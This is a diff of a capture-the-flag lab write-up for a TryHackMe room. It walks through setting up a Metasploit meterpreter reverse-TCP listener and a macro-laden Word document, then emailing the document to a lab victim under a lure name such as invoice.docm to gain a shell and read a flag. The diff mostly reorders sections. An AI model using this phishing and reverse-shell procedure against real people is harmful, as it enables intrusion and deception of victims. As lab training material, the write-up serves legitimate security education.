@@ -51,7 +51,7 @@ The attacker, Mayor Malware, needs to create a document with a malicious macro. 
 ## 🚀 Step-by-Step Guide
 
 ### 1️⃣ Initial Setup in Metasploit
-First, we need to configure the Metasploit payload. We’ll use a `windows/meterpreter/reverse_tcp` payload to receive a reverse connection from the victim's machine. The `[ATTACKERS_IP]` is the IP from our atack box.
+First, we need to configure the Metasploit payload. We’ll use a `windows/meterpreter/reverse_tcp` payload to receive a reverse connection from the victim's machine. The `[ATTACKERS_IP]` is the IP from our AttackBox.
 
 ```bash
 msfconsole
@@ -63,24 +63,14 @@ show options
 exploit
 ```
 
+---
+
 ### 2️⃣ Exploiting the Malicious Document
 After setting up the exploit, we need to generate the malicious Word file with a macro and send it to the victim. Once the victim opens the file, the reverse shell will be triggered, establishing the connection.
 
 ---
 
-### 3️⃣ Sending the Malicious Document via Email
-To send the malicious document, we will use RainLoop, a webmail client available on the attacker's machine. You can access it by visiting the provided link on the AttackBox.
-
-- **Link for accessing RainLoop**: [Link to RainLoop webmail client]
-- **Login credentials**:
-  - **Email**: `info@socnas.thm`
-  - **Password**: `MerryPhishMas!`
-
-Once logged in, compose an email to the victim (`marta@socmas.thm`). Attach the malicious Word file (renaming it to something convincing like `invoice.docm` or `receipt.docm`), and craft a message to encourage the victim to open it. For example, mention that it contains an important invoice or document that requires their attention.
-
----
-
-### 4️⃣ Handling the Connection in Metasploit
+### 3️⃣ Handling the Connection in Metasploit
 After the victim opens the malicious file, the reverse connection is made. We configure Metasploit to listen for incoming connections.
 
 ```bash
@@ -92,6 +82,20 @@ set LPORT 8888
 show options
 exploit
 ```
+
+---
+
+### 4️⃣ Sending the Malicious Document via Email
+To send the malicious document, we will use RainLoop, a webmail client available on the attacker's machine. You can access it by visiting the provided link on the AttackBox.
+
+- **Link for accessing RainLoop**: [Link provide from TryHackMe]
+- **Login credentials**:
+  - **Email**: `info@socnas.thm`
+  - **Password**: `MerryPhishMas!`
+
+Once logged in, compose an email to the victim (`marta@socmas.thm`). Attach the malicious Word file (renaming it to something convincing like `invoice.docm` or `receipt.docm`), and craft a message to encourage the victim to open it. For example, mention that it contains an important invoice or document that requires their attention.
+
+---
 
 ### 5️⃣ Gaining Access to the Victim's Machine
 Once the victim opens the document and runs the macro, we gain access to their system via the reverse shell. Now we can execute commands on their machine.
@@ -107,14 +111,22 @@ ls
 cat flag.txt
 ```
 
+---
+
 ### 7️⃣ Conclusion
-By running the cat flag.txt command, we successfully obtain the flag, completing the room. Congratulations!
+By running the cat flag.txt command, we successfully obtain the flag, completing the room.
+
+---
 
 ### 🖼️ Resources
 (Include screenshots or useful links here.)
 
+---
+
 ### 📌 Final Notes
 This exercise demonstrated how to perform a phishing attack using a malicious macro to gain remote access to a system and exfiltrate information.
+
+---
 
 ### 🏆 Final Outcome
 After completing all the steps and capturing the flag, the room is finished.
